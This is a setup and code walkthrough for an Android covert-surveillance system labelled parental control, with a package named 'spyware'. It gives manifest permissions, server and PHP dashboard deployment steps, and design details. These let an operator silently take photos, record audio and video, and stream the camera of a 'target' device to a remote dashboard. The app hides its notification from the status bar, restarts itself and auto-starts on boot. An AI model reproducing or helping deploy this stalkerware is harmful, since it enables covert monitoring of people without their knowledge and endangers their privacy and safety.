# 🛠️ Complete Setup Guide — WebRTC Android ParentControl v2.0

> **Architecture**: Android App (Kotlin) ↔ Node.js Backend (Render) ↔ PHP Dashboard (your PHP host)

---

## 📋 Requirements

| Component | Requirement |
|---|---|
| PHP Host | Any shared hosting / VPS / cPanel with PHP 7.4+, MySQL 5.7+ |
| Node.js Server | Render.com free tier (or any VPS with Node 18+) |
| Android Device | Android 9+ (API 28+), Camera + Mic permissions |
| Browser | Chrome 80+ / Firefox 75+ / Edge 80+ |
| Android Studio | Arctic Fox+ (for building APK) |
| npm | v8+ |

---

## 🏗️ Full Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                     SYSTEM ARCHITECTURE                         │
└─────────────────────────────────────────────────────────────────┘

  📱 Android Device                    🖥️ Admin Browser
  ┌─────────────────┐                 ┌─────────────────┐
  │ SpywareService  │                 │  PHP Dashboard  │
  │ (Foreground)    │                 │  index.php      │
  │                 │                 │  login.php      │
  │ SocketManager   │◄───Socket.IO───►│  (PHP host)     │
  │ MediaCapture    │                 │                 │
  │ Manager         │      ▲          │  Browser JS     │
  │                 │      │          │  ↕ Socket.IO    │
  │ WebRTC          │      │          │  ↕ WebRTC       │
  │ PeerConnection  │      │          └────────┬────────┘
  └─────────────────┘      │                   │
         │                 └───────────────────┘
         │                         ▲
         ▼                         │
  ┌─────────────────────────────────────────────────────┐
  │           Node.js Backend (Render.com)               │
  │           node-backend/server.js                     │
  │                                                      │
  │  • Device registration (register-device)            │
  │  • Controller join (join-as-controller)             │
  │  • WebRTC signaling (offer/answer/ice-candidate)    │
  │  • Capture commands relay (capture-image/audio/video)│
  │  • Media base64 forwarding (media-captured → media-ready)│
  │  • Auto-reconnect (pingTimeout: 60s, pingInterval: 25s) │
  │  • GET /health → { status: 'ok' } for Render        │
  └─────────────────────────────────────────────────────┘
         │
         ▼ (base64 media upload via fetch)
  ┌─────────────────────────────────────────────────────┐
  │           PHP Dashboard + MySQL                      │
  │           php-dashboard/                             │
  │                                                      │
  │  • install.php  → one-click DB + admin setup        │
  │  • login.php    → bcrypt auth                       │
  │  • index.php    → dashboard UI + WebRTC viewer      │
  │  • upload_media.php → save base64 media to uploads/ │
  │  • delete_media.php → remove files + DB rows        │
  │  • MySQL: admins, devices, media_captures tables    │
  │  • Auto-delete media after 24 hours                 │
  └─────────────────────────────────────────────────────┘
```

---

## 🚀 Step-by-Step Setup

### Step 1 — Clone Repository

```bash
git clone https://github.com/david0154/WebRTC-Android-prentcontrol.git
cd WebRTC-Android-prentcontrol
```

---

### Step 2 — Deploy Node.js Backend on Render

1. Go to [render.com](https://render.com) → **New Web Service**
2. Connect your GitHub repo: `david0154/WebRTC-Android-prentcontrol`
3. Set these settings:

| Setting | Value |
|---|---|
| Root Directory | `node-backend` |
| Build Command | `npm install` |
| Start Command | `node server.js` |
| Environment | `Node` |
| Health Check Path | `/health` |
| Plan | Free |

4. Click **Create Web Service**
5. Wait for deploy → copy your URL: `https://YOUR-APP.onrender.com`

> ⚠️ **Render Free Tier**: Server sleeps after 15 min inactivity. Android app auto-reconnects when it wakes.

> ✅ **`/` endpoint returns JSON only** — no web dashboard opens on Render URL.

---

### Step 3 — Setup PHP Dashboard (One-Click Install)

1. Upload the entire `php-dashboard/` folder to your PHP web host root (via FTP/cPanel)
2. Open in browser: `https://your-domain.com/install.php`
3. Fill in the form:

| Field | Example |
|---|---|
| DB Host | `localhost` |
| DB Name | `parentcontrol` |
| DB User | `your_db_user` |
| DB Password | `your_db_pass` |
| Admin Username | `admin` |
| Admin Password | `StrongPass123!` |
| Node.js Backend URL | `https://YOUR-APP.onrender.com` |

4. Click **Install Now** — tables auto-created, `config.php` written
5. ⚠️ **Delete `install.php`** immediately after successful install
6. Visit `https://your-domain.com/login.php` → login with admin credentials

---

### Step 4 — Build Android App

1. Open project root in **Android Studio**
2. Open `app/src/main/java/com/webrtc/spyware/SpywareService.kt`
3. Replace the server URL:
```kotlin
// Line ~17
private val SERVER_URL = "https://YOUR-APP.onrender.com"
// ↑ Replace with your actual Render URL
```

4. Open `app/src/main/AndroidManifest.xml` and add all entries from `AndroidManifest_additions.xml`:
```xml
<!-- Permissions (add inside <manifest>) -->
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.WAKE_LOCK" />

<!-- Components (add inside <application>) -->
<service
    android:name=".SpywareService"
    android:exported="false"
    android:foregroundServiceType="camera|microphone" />

<receiver
    android:name=".BootReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

5. Sync Gradle → **Build → Generate Signed APK** (or run on device directly)
6. Install on target Android device
7. Grant all permissions when prompted:
   - 📷 Camera
   - 🎤 Microphone
   - 📡 Internet
   - 🔔 Notifications

---

### Step 5 — Verify Everything Works

1. Install APK on Android device
2. Open PHP dashboard → `login.php` → login
3. Within a few seconds, device should appear in **Connected Devices**
4. Click **▶ Live View** to start WebRTC stream
5. Click **📷 Photo**, **🎤 Audio**, or **🎬 Video** to test capture

---

## 📁 Complete Codebase Deep Dive

---

### 🤖 Android — Kotlin Source Files

#### `app/src/main/java/com/webrtc/spyware/SpywareService.kt`

The **main entry point** of the Android side. Runs as a persistent foreground service.

```
SpywareService (extends Service)
│
├── onCreate()
│   ├── createNotificationChannel()     → silent notification (IMPORTANCE_MIN)
│   ├── startForeground(1, notification) → keeps process alive
│   ├── reads ANDROID_ID                → unique device identifier
│   ├── creates SocketManager(serverUrl, deviceId, callback)
│   ├── creates MediaCaptureManager(context, socketManager)
│   └── socketManager.connect()         → initiates Socket.IO connection
│
├── handleCaptureCommand(type, params)
│   ├── "image" → mediaCaptureManager.captureImage(useFront)
│   ├── "audio" → mediaCaptureManager.captureAudio(duration)
│   ├── "video" → mediaCaptureManager.captureVideo(duration, useFront)
│   └── "start-stream" → logs (handled in Activity for WebRTC)
│
├── onStartCommand() → returns START_STICKY (auto-restart if killed)
└── onDestroy()      → releases mediaCaptureManager + socketManager
```

**Key design**: `START_STICKY` ensures Android restarts the service if system kills it. Notification channel uses `IMPORTANCE_MIN` to hide from status bar.

---

#### `app/src/main/java/com/webrtc/spyware/SocketManager.kt`

Wraps the **Socket.IO client** with auto-reconnect and command dispatching.

```
SocketManager
│
├── connect()
│   ├── IO.Options: reconnection=true, delay=2s, maxDelay=10s, attempts=∞
│   ├── socket.on(EVENT_CONNECT)        → emits "register-device" with deviceId
│   ├── socket.on(EVENT_DISCONNECT)     → logs, isConnected=false
│   ├── socket.on(EVENT_CONNECT_ERROR)  → logs error
│   ├── socket.on("capture-image")      → calls onCaptureCommand("image", params)
│   ├── socket.on("capture-audio")      → calls onCaptureCommand("audio", params)
│   ├── socket.on("capture-video")      → calls onCaptureCommand("video", params)
│   └── socket.on("start-stream")       → calls onCaptureCommand("start-stream", {})
│
├── sendMediaCapture(base64, type, filename, mimeType)
│   └── emits "media-captured" → { deviceId, type, base64, filename, mimeType }
│
├── emitSignaling(event, data)          → forward WebRTC SDP/ICE
└── disconnect()                        → clean shutdown
```

**Auto-reconnect logic**: `reconnectionAttempts = Int.MAX_VALUE` with exponential backoff from 2s → 10s max. The Node.js server has `pingTimeout: 60000` and `pingInterval: 25000` matching the client.

---

#### `app/src/main/java/com/webrtc/spyware/MediaCaptureManager.kt`

Handles **silent camera2 + MediaRecorder** captures on a dedicated background thread.

```
MediaCaptureManager
│
├── captureImage(useFront: Boolean)
│   ├── getFacingCamera(LENS_FACING_FRONT / BACK)  → gets camera ID
│   ├── ImageReader(1280×720, JPEG, maxImages=1)
│   ├── openCamera → createCaptureSession → TEMPLATE_STILL_CAPTURE
│   ├── onImageAvailable: reads buffer → Base64.encode → sendMediaCapture()
│   └── File auto-freed (stays in ImageReader buffer, not disk)
│
├── captureAudio(durationSeconds: Int = 10)
│   ├── MediaRecorder: MIC → MPEG_4 → AAC @ 128kbps / 44.1kHz
│   ├── setMaxDuration(seconds × 1000)
│   ├── setOnInfoListener: MAX_DURATION_REACHED → stop() → sendFile()
│   └── File saved to context.cacheDir, deleted after upload
│
├── captureVideo(durationSeconds: Int = 15, useFront: Boolean)
│   ├── MediaRecorder: SURFACE + MIC → MPEG_4 → H264 + AAC
│   ├── 1280×720 @ 30fps, 3Mbps bitrate
│   ├── openCamera(Camera2) → createCaptureSession → TEMPLATE_RECORD
│   ├── session.setRepeatingRequest → mediaRecorder.start()
│   └── MAX_DURATION_REACHED → stop() → sendFile() → file.delete()
│
├── sendFile(file, type, mime)   → readBytes → Base64 → socketManager.sendMediaCapture()
├── getFacingCamera(facing)      → filters cameraIdList by LENS_FACING characteristic
└── release()                   → mediaRecorder.release(), cameraDevice.close(), bgThread.quitSafely()
```

**Background thread**: `HandlerThread("CaptureThread")` + `Handler(bgThread.looper)` — all Camera2 callbacks run off the main thread to avoid ANR.

---

#### `app/src/main/java/com/webrtc/spyware/BootReceiver.kt`

BroadcastReceiver for `ACTION_BOOT_COMPLETED` — calls `startForegroundService(SpywareService)` on Android O+ or `startService()` on older versions.

---

### 🟢 Node.js Backend — `node-backend/server.js`

Pure **Socket.IO signaling server** — no web UI, no static files.

```
server.js
│
├── Express app + HTTP server + Socket.IO
│   ├── GET /         → { status: 'ok' }   (no dashboard, just JSON)
│   └── GET /health   → { status: 'ok', connections: N }
│
├── State
│   ├── rooms{}        → socket.id → { type, deviceId }
│   └── deviceSockets{}→ deviceId → socket.id
│
├── io.on("connection", socket)
│   ├── "register-device" (from Android)
│   │   ├── stores deviceSockets[deviceId] = socket.id
│   │   ├── socket.join(`device_${deviceId}`)
│   │   └── io.emit("device-list-update", allDeviceIds)
│   │
│   ├── "join-as-controller" (from Dashboard)
│   │   ├── socket.join(`ctrl_${deviceId}`)
│   │   └── io.to(`device_${deviceId}`).emit("start-stream")
│   │
│   ├── WebRTC Signaling
│   │   ├── "offer"          → io.to(data.to).emit("offer", { sdp, from })
│   │   ├── "answer"         → io.to(data.to).emit("answer", { sdp, from })
│   │   └── "ice-candidate"  → io.to(data.to).emit("ice-candidate", { candidate, from })
│   │
│   ├── Capture Commands (from Dashboard → Device)
│   │   ├── "capture-image" → io.to(`device_${deviceId}`).emit("capture-image", { camera })
│   │   ├── "capture-audio" → io.to(`device_${deviceId}`).emit("capture-audio", { duration })
│   │   └── "capture-video" → io.to(`device_${deviceId}`).emit("capture-video", { duration, camera })
│   │
│   ├── "media-captured" (from Android)
│   │   └── io.to(`ctrl_${deviceId}`).emit("media-ready", data)
│   │
│   └── "disconnect"
│       ├── removes from deviceSockets{}
│       └── io.emit("device-list-update", remaining)
│
└── server.listen(PORT || 3000)
```

**Anti-connection-loss**: `pingTimeout: 60000`, `pingInterval: 25000`. Room-based isolation ensures a dashboard controller only receives events from its targeted device.

---

### 🐘 PHP Dashboard — `php-dashboard/`

#### `install.php` — One-Click Installer

```
install.php (POST handler)
│
├── Connects to MySQL with provided credentials
├── CREATE DATABASE IF NOT EXISTS `parentcontrol`
├── CREATE TABLE admins    (id, username UNIQUE, password bcrypt, created_at)
├── CREATE TABLE devices   (id, device_id UNIQUE, device_name, last_seen, created_at)
├── CREATE TABLE media_captures
│   (id, device_id, media_type ENUM(image/audio/video),
│    filename, file_path, file_size, captured_at, expires_at)
│   INDEX on: device_id, media_type, captured_at
├── INSERT admin user with password_hash(pass, PASSWORD_BCRYPT)
├── Writes config.php with all constants
└── mkdir uploads/ + uploads/.htaccess (Options -Indexes)
```

---

#### `config.php` — Auto-Generated Config

```php
define('DB_HOST',   'localhost');
define('DB_NAME',   'parentcontrol');
define('DB_USER',   'user');
define('DB_PASS',   'pass');
define('NODE_BACKEND_URL',      'https://your-app.onrender.com');
define('MEDIA_UPLOAD_DIR',      __DIR__ . '/uploads/');
define('MEDIA_TEMP_EXPIRY_HOURS', 24);  // auto-delete after 24h
session_start();                        // all pages share session
```

---

#### `login.php` — Authentication

```
login.php
├── GET  → shows login form (dark themed)
├── POST → PDO query: SELECT * FROM admins WHERE username = ?
│          password_verify(input, stored_hash)
│          if match → $_SESSION['admin_id'] + ['admin_user']
│                   → redirect index.php
│          else     → show error message
└── If already logged in → redirect index.php
```

---

#### `index.php` — Main Dashboard

```
index.php
│
├── Auth check: !$_SESSION['admin_id'] → redirect login.php
├── PDO connect to MySQL
├── Auto-cleanup: DELETE FROM media_captures WHERE expires_at < NOW()
├── Stats queries: COUNT devices, images, audios, videos
├── Fetch: device_list (last 50 by last_seen DESC)
├── Fetch: recent_media (last 30 by captured_at DESC)
│
├── HTML Dashboard
│   ├── Stats bar (4 tiles: devices / images / audios / videos)
│   ├── Device Cards grid
│   │   ├── [▶ Live View]  → startLive(deviceId)
│   │   ├── [📷 Photo]     → captureImage(deviceId)
│   │   ├── [🎤 Audio]     → captureAudio(deviceId)
│   │   └── [🎬 Video]     → captureVideo(deviceId)
│   ├── Live View section (hidden until startLive())
│   │   └── <video id="remote-video" autoplay>
│   └── Media Gallery grid
│       ├── <img> for images
│       ├── <audio controls> for audio
│       ├── <video controls> for video
│       └── Download ↓ + 🗑 Delete links per item
│
└── JavaScript (Socket.IO + WebRTC)
    ├── io(NODE_URL, { reconnection: true, reconnectionDelay: 2000 })
    ├── on("connect")           → update status bar ✅
    ├── on("disconnect")        → update status bar 🔴
    ├── on("device-list-update")→ highlight online devices (green border)
    ├── startLive(deviceId)
    │   ├── new RTCPeerConnection({ iceServers: [stun:stun.l.google.com] })
    │   ├── ontrack → remote-video.srcObject = stream
    │   └── socket.emit("join-as-controller", { deviceId })
    ├── on("offer")             → setRemoteDesc → createAnswer → emit "answer"
    ├── on("ice-candidate")     → addIceCandidate
    ├── captureImage/Audio/Video → emit capture command via socket
    ├── on("media-ready")       → b64toBlob → FormData → POST upload_media.php
    └── b64toBlob(b64, mime)    → Uint8Array → Blob
```

---

#### `upload_media.php` — Media Storage

```
upload_media.php (POST)
│
├── Validates: device_id (sanitized), media_type (whitelist)
├── Checks $_FILES['file']['tmp_name'] not empty
├── Generates filename: {device_id}_{date}_{uniqid}.{ext}
├── move_uploaded_file() to uploads/
├── Calculates expires_at = NOW() + MEDIA_TEMP_EXPIRY_HOURS
├── INSERT INTO media_captures (device_id, media_type, filename, file_path, file_size, expires_at)
├── INSERT INTO devices ... ON DUPLICATE KEY UPDATE last_seen=NOW()
└── Returns JSON { success: true, filename }
```

---

#### `delete_media.php` — Media Deletion

```
delete_media.php (GET ?id=N)
├── Auth check
├── SELECT file_path WHERE id=N
├── unlink(file_path) if file exists
├── DELETE FROM media_captures WHERE id=N
└── redirect index.php
```

---

### 🗄️ Database Schema

```sql
-- Admin users (login credentials)
CREATE TABLE admins (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    username   VARCHAR(100) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,        -- bcrypt hash
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Connected Android devices
CREATE TABLE devices (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    device_id   VARCHAR(100) NOT NULL UNIQUE,  -- ANDROID_ID
    device_name VARCHAR(200),
    last_seen   DATETIME,
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Temporary media captures (auto-purged after 24h)
CREATE TABLE media_captures (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    device_id  VARCHAR(100) NOT NULL,
    media_type ENUM('image','audio','video') NOT NULL,
    filename   VARCHAR(300) NOT NULL,
    file_path  VARCHAR(500) NOT NULL,
    file_size  INT DEFAULT 0,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at  DATETIME DEFAULT NULL,
    INDEX (device_id),
    INDEX (media_type),
    INDEX (captured_at)
);
```

---

## 🔄 Full Data Flow — Media Capture

```
1. Admin clicks [📷 Photo] in browser dashboard
      ↓
2. index.php JS: socket.emit("capture-image", { deviceId: "abc123", camera: "front" })
      ↓
3. Node.js server: receives "capture-image"
      → io.to(`device_abc123`).emit("capture-image", { camera: "front" })
      ↓
4. Android SocketManager.kt: receives "capture-image" event
      → calls onCaptureCommand("image", { camera: "front" })
      ↓
5. SpywareService.kt: handleCaptureCommand("image", params)
      → mediaCaptureManager.captureImage(useFront = true)
      ↓
6. MediaCaptureManager.kt: Camera2 API
      → ImageReader(1280×720, JPEG)
      → onImageAvailable: readBytes → Base64.encode
      → socketManager.sendMediaCapture(b64, "image", "img_20260521_112800.jpg", "image/jpeg")
      ↓
7. Android: socket.emit("media-captured", { deviceId, type, base64, filename, mimeType })
      ↓
8. Node.js: receives "media-captured"
      → io.to(`ctrl_abc123`).emit("media-ready", data)
      ↓
9. Browser JS (index.php): receives "media-ready"
      → b64toBlob(data.base64, "image/jpeg")
      → FormData: file + device_id + media_type
      → fetch("upload_media.php", { method: POST, body: formData })
      ↓
10. upload_media.php:
       → move_uploaded_file() to uploads/
       → INSERT INTO media_captures
       → UPDATE devices last_seen
       → returns { success: true }
      ↓
11. Browser: location.reload() → image appears in gallery ✅
```

---

## 🔄 Full Data Flow — WebRTC Live View

```
1. Admin clicks [▶ Live View] for device "abc123"
      ↓
2. Browser JS: new RTCPeerConnection(STUN config)
      socket.emit("join-as-controller", { deviceId: "abc123" })
      ↓
3. Node.js: socket.join(`ctrl_abc123`)
      → io.to(`device_abc123`).emit("start-stream")
      ↓
4. Android SocketManager: receives "start-stream"
      → triggers WebRTC offer creation in Activity
      (calls getUserMedia → createOffer → setLocalDescription)
      socket.emit("offer", { to: controllerId, sdp: offer })
      ↓
5. Node.js: io.to(controllerId).emit("offer", { sdp, from: deviceSocketId })
      ↓
6. Browser: setRemoteDescription(offer)
      → createAnswer → setLocalDescription
      socket.emit("answer", { to: from, sdp: answer })
      ↓
7. ICE candidates exchanged via Node.js relay
      ↓
8. WebRTC P2P connection established
      → ontrack: remote-video.srcObject = stream 📺
```

---

## 🔧 Local Development

```bash
# 1. Run Node.js backend locally
cd node-backend
npm install
node server.js
# Server at http://localhost:3000

# 2. PHP dashboard — use XAMPP/Laragon
# Copy php-dashboard/ to htdocs/
# Open install.php → use localhost DB
# Set Node URL to http://localhost:3000

# 3. Android — change SERVER_URL in SpywareService.kt
# to http://10.0.2.2:3000 (emulator) or http://YOUR-LAN-IP:3000 (device)
```

---

## 🚨 Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| Device not appearing in dashboard | Wrong `SERVER_URL` in Android | Check `SpywareService.kt` Render URL |
| `install.php` DB error | Wrong credentials | Verify MySQL user has CREATE privilege |
| Capture buttons do nothing | Device offline / disconnected | Check green border on device card |
| Live view black screen | WebRTC permissions | Ensure HTTPS on PHP host; allow camera/mic in browser |
| Media not uploading | `upload_media.php` path wrong | Verify `php-dashboard/uploads/` folder exists + writable (chmod 755) |
| Render sleeping (free tier) | Inactivity | Android auto-reconnects on wake; use UptimeRobot ping to keep alive |
| `CORS blocked` | Node origin mismatch | Node.js uses `origin: '*'` — should not block; check browser console |
| Audio/Video garbled | Low bitrate or network | MediaRecorder uses 128kbps AAC + 3Mbps H264; reduce if needed |
| `foregroundServiceType` error | Android 14+ strict | Ensure `FOREGROUND_SERVICE_CAMERA` + `FOREGROUND_SERVICE_MICROPHONE` in manifest |
| App killed by battery saver | Manufacturer battery optimization | Whitelist app from battery optimization in device settings |

---

## 📦 Environment Variables

### Render (Node.js)
| Variable | Value |
|---|---|
| `PORT` | Auto-set by Render (3000 default) |
| `NODE_ENV` | `production` |

### PHP Host
All config written to `config.php` by `install.php`. No `.env` needed.

---

## 📂 Complete File Tree

```
WebRTC-Android-prentcontrol/
│
├── 📱 Android App (Kotlin)
│   ├── app/build.gradle.kts
│   ├── app/src/main/
│   │   ├── AndroidManifest.xml
│   │   ├── AndroidManifest_additions.xml   ← permissions guide
│   │   └── java/com/webrtc/spyware/
│   │       ├── SpywareService.kt           ← foreground service (main)
│   │       ├── SocketManager.kt            ← Socket.IO + auto-reconnect
│   │       ├── MediaCaptureManager.kt      ← Camera2 + MediaRecorder
│   │       └── BootReceiver.kt             ← auto-start on boot
│   └── build.gradle.kts
│
├── 🟢 Node.js Backend (Render)
│   └── node-backend/
│       ├── server.js                       ← Socket.IO signaling server
│       ├── package.json
│       └── render.yaml                     ← Render deploy config
│
├── 🐘 PHP Dashboard (your host)
│   └── php-dashboard/
│       ├── install.php                     ← one-click installer
│       ├── config.php                      ← auto-generated by installer
│       ├── login.php                       ← admin login
│       ├── index.php                       ← main dashboard + media gallery
│       ├── upload_media.php                ← receives + stores media
│       ├── delete_media.php                ← removes media
│       ├── logout.php
│       ├── .htaccess
│       ├── uploads/                        ← media files (auto-created)
│       └── README.md
│
├── 📦 Legacy Server (backward compat)
│   └── Android-WebRTC-Spyware-Server/
│       ├── server.js                       ← updated with new events
│       ├── package.json
│       └── render.yaml
│
├── README.md
├── SETUP.md                                ← this file
└── LICENSE
```

---

*Built with Node.js · Socket.IO · WebRTC · PHP · MySQL · Kotlin · Camera2 API · MediaRecorder*
